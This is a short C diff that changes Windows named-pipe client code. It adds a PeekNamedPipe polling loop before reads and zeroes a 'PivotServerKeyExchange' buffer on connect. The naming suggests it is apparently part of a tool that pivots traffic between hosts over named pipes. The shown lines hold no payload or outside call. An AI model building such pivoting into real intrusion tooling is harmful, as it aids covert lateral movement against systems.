@@ -49,9 +49,19 @@ PBUFFER RawPipeRecv
 	DWORD dwZeroTimeout = 0;
 	BOOL IsOk = FALSE;
 	DWORD dwNumberOfBytesRead = 0;
+	DWORD dwTotalBytesAvail = 0;
 
 	EnterCriticalSection(pPipeClient->pReadLock);
 	Result = ALLOC(sizeof(BUFFER));
+	while (dwTotalBytesAvail == 0) {
+		if (!PeekNamedPipe(pPipeClient->hPipe, NULL, 0, NULL, &dwTotalBytesAvail, NULL)) {
+			LOG_ERROR("PeekNamedPipe", GetLastError());
+			goto CLEANUP;
+		}
+
+		Sleep(500);
+	}
+	
 	if (!ReadFile(pPipeClient->hPipe, &Result->cbBuffer, sizeof(Result->cbBuffer), &dwNumberOfBytesRead, NULL)) {
 		LOG_ERROR("ReadFile", GetLastError());
 		goto CLEANUP;
@@ -62,6 +72,7 @@ PBUFFER RawPipeRecv
 	}
 
 	Result->pBuffer = ALLOC(Result->cbBuffer);
+	dwTotalBytesAvail = 0;
 	if (!ReadFile(pPipeClient->hPipe, Result->pBuffer, Result->cbBuffer, &dwNumberOfBytesRead, NULL)) {
 		LOG_ERROR("ReadFile", GetLastError());
 		goto CLEANUP;
@@ -176,6 +187,7 @@ BOOL PipeStart
 	DWORD i = 0;
 	DWORD dwMode = PIPE_READMODE_MESSAGE | PIPE_WAIT;
 
+	SecureZeroMemory(PivotServerKeyExchange, sizeof(PivotServerKeyExchange));
 	pPipeClient->hPipe = CreateFileA(pPipeClient->lpBindAddress, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
 	if (pPipeClient->hPipe == INVALID_HANDLE_VALUE) {
 		LOG_ERROR("CreateFileA", GetLastError());
